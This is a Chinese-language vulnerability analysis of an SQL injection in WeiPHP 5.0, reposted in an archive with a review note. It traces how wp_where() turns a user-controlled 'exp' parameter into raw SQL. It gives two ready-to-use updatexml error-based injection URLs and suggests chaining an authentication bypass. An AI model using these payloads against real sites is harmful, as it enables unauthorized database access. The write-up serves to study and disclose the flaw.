---
source: "MrWQ/vulnerability-paper"
product: "WeiPHP / wp_where表达式转换"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Weiphp exp表达式注入 - Y4er的博客"
prerequisites: "来源所述条件，未列明部分仍待核：2019-12-11官网5.0，需参数可控wp_where，前台bind_follow、后台_send_by_group结合POST绕过"
side_effects: "未执行；本文需注意的操作影响：权限和副作用需逐端点分开；bind_follow与发送分组接口不应共享未授权结论，后者依597鉴权缺陷，正常调用可能发消息"
source_status: "recorded"
source_url: "https://y4er.com/post/weiphp-exp-sql/"
id: "vw-c7d4a1916fab5fe9a80dde9a"
entity_id: "ve-c7d4a1916fab5fe9a80dde9a"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：2019-12-11官网5.0，需参数可控wp_where，前台bind_follow、后台_send_by_group结合POST绕过

代码与实验材料：完整wp_where→Db.raw→Expression→SQL链，两个独立端点实例

来源证据范围：Y4er原文，依赖版本及fix未列

- **事实待核（1）**：产品版本不是不可变构建；依据：官网最新版+日期尚不足锁源码，需commit/发布哈希及修复。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **操作与副作用边界（2）**：权限和副作用需逐端点分开；依据：bind_follow与发送分组接口不应共享未授权结论，后者依597鉴权缺陷，正常调用可能发消息。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **适用与权限边界（3）**：原生SQL功能与应用危险转换须区分；依据：这里是WeiPHP将外部exp显式转Db.raw，不是所有ThinkPHP框架请求默认SQL注入。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Weiphp exp表达式注入 - Y4er的博客

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [y4er.com](https://y4er.com/post/weiphp-exp-sql/)

和thinkphp3.2.3的exp注入类似。

payload
-------

```
http://php.local/public/index.php/home/index/bind_follow/?publicid=1&is_ajax=1&uid[0]=exp&uid[1]=) and updatexml(1,concat(0x7e,user(),0x7e),1) -- + 
```

分析
--

\app\home\controller\Index::bind_follow()

![20191211101117](https://y4er.com/img/uploads/20191211101117.png)

uid直接通过`I()`获取

```
<?php
function I($name, $default = '', $filter = null, $datas = null)
{
    return input($name, $default, $filter);
} 
```

然后经过 `wp_where()` -> `where()` -> `find()`函数

```
<?php
$info = M('user_follow')->where(wp_where($map))->find(); 
```

跟进 `wp_where()`

```
<?php
function wp_where($field)
{
    if (!is_array($field)) {
        return $field;
    }

    $res = [];
    foreach ($field as $key => $value) {
        if (is_numeric($key) || (is_array($value) && count($value) == 3)) {
            if (strtolower($value[1]) == 'exp' && !is_object($value[2])) {
                $value[2] = Db::raw($value[2]);
            }
            $res[] = $value;
        } elseif (is_array($value)) {
            if (strtolower($value[0]) == 'exp' && !is_object($value[1])) {
                $value[1] = Db::raw($value[1]);
            }
            $res[] = [
                $key,
                $value[0],
                $value[1]
            ];
        } else {
            $res[] = [
                $key,
                '=',
                $value
            ];
        }
    }
    //    dump($res);
    return $res;
} 
```

在elseif语句中，如果传入的字段是数组，并且下标为0的值为exp，那么会执行 `Db::raw()`来进行表达式查询

![20191211102436](https://y4er.com/img/uploads/20191211102436.png)

跟进 `Db::raw()` 进入到 `\think\Db::__callStatic`，`$method`为 `raw()`

```
<?php
public static function __callStatic($method, $args)
{
    return call_user_func_array([static::connect(), $method], $args);
} 
```

call_user_func_array回调`[static::connect(),$method]`，跟进`static::connect()`

```
<?php
public static function connect($config = [], $name = false, $query = '')
{
    // 解析配置参数
    $options = self::parseConfig($config ?: self::$config);

    $query = $query ?: $options['query'];

    // 创建数据库连接对象实例
    self::$connection = Connection::instance($options, $name);

    return new $query(self::$connection);
} 
```

![20191211102708](https://y4er.com/img/uploads/20191211102708.png)

返回的是`\think\db\Query`类，那么call_user_func_array回调的就是`\think\db\Query`类下的 `raw()` 方法。

继续跟进

```
<?php
//\think\db\Query::raw
public function raw($value)
{
    return new Expression($value);
} 
```

发现返回的是一个表达式，最后`wp_where()`返回`res`

![20191211103106](https://y4er.com/img/uploads/20191211103106.png)

进入到where()

```
<?php
public function where($field, $op = null, $condition = null)
{
    $param = func_get_args();
    array_shift($param);
    return $this->parseWhereExp('AND', $field, $op, $condition, $param);
} 
```

进入`parseWhereExp()`

```
<?php
protected function parseWhereExp($logic, $field, $op, $condition, array $param = [], $strict = false)
{
    ...省略
    if ($field instanceof Expression) {
        return $this->whereRaw($field, is_array($op) ? $op : [], $logic);
    } elseif ($strict) {
        // 使用严格模式查询
        $where = [$field, $op, $condition, $logic];
    } elseif (is_array($field)) {
        // 解析数组批量查询
        return $this->parseArrayWhereItems($field, $logic);
    }
    ...省略
    return $this;
} 
```

满足elseif是数组条件，进入到 `parseArrayWhereItems()`

```
<?php
protected function parseArrayWhereItems($field, $logic)
{
    if (key($field) !== 0) {
        $where = [];
        foreach ($field as $key => $val) {
            if ($val instanceof Expression) {
                $where[] = [$key, 'exp', $val];
            } elseif (is_null($val)) {
                $where[] = [$key, 'NULL', ''];
            } else {
                $where[] = [$key, is_array($val) ? 'IN' : '=', $val];
            }
        }
    }
    else {
        // 数组批量查询
        $where = $field;
    }

    if (!empty($where)) {
        $this->options['where'][$logic] = isset($this->options['where'][$logic]) ? array_merge($this->options['where'][$logic], $where) : $where;
    }

    return $this;
} 
```

合并where条件之后返回`$this`，然后进入到find()函数

```
<?php
public function find($data = null)
{
    if ($data instanceof Query) {
        return $data->find();
    } elseif ($data instanceof \Closure) {
        $data($this);
        $data = null;
    }

    $this->parseOptions();

    if (!is_null($data)) {
        // AR模式分析主键条件
        $this->parsePkWhere($data);
    }

    $this->options['data'] = $data;

    $result = $this->connection->find($this);

    if ($this->options['fetch_sql']) {
        return $result;
    }

    // 数据处理
    if (empty($result)) {
        return $this->resultToEmpty();
    }

    if (!empty($this->model)) {
        // 返回模型对象
        $this->resultToModel($result, $this->options);
    } else {
        $this->result($result);
    }

    return $result;
} 
```

进入`$this->connection->find($this)`

```
<?php
public function find(Query $query)
{
    // 分析查询表达式
    $options = $query->getOptions();
    $pk      = $query->getPk($options);

    $data = $options['data'];
    $query->setOption('limit', 1);
    ...

    $query->setOption('data', $data);

    // 生成查询SQL
    $sql = $this->builder->select($query);

    $query->removeOption('limit');

    $bind = $query->getBind();

    if (!empty($options['fetch_sql'])) {
        // 获取实际执行的SQL语句
        return $this->getRealSql($sql, $bind);
    }

    // 事件回调
    $result = $query->trigger('before_find');

    if (!$result) {
        // 执行查询
        $resultSet = $this->query($sql, $bind, $options['master'], $options['fetch_pdo']);

        if ($resultSet instanceof \PDOStatement) {
            // 返回PDOStatement对象
            return $resultSet;
        }

        $result = isset($resultSet[0]) ? $resultSet[0] : null;
    }
    ...

        return $result;
} 
```

![20191211104045](https://y4er.com/img/uploads/20191211104045.png)

在`$this->builder->select($query)`生成SQL语句，带入恶意SQL

![20191211104703](https://y4er.com/img/uploads/20191211104703.png)

造成注入。

![20191211104738](https://y4er.com/img/uploads/20191211104738.png)

影响范围
----

2019/12/11 weiphp5.0官网最新版

所有使用了 `wp_where()` 函数并且参数可控的SQL查询均受到影响，前台后台均存在注入。

![20191211110406](https://y4er.com/img/uploads/20191211110406.png)

需要登录的点可以配合之前写的《weiphp多数模块存在未授权访问》来绕过登录进行注入。

比如

```
http://php.local/public/index.php/weixin/message/_send_by_group
POST:group_id[0]=exp&group_id[1]=) and updatexml(1,concat(0x7e,user(),0x7e),1) -- 
```

![20191211105553](https://y4er.com/img/uploads/20191211105553.png)

**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
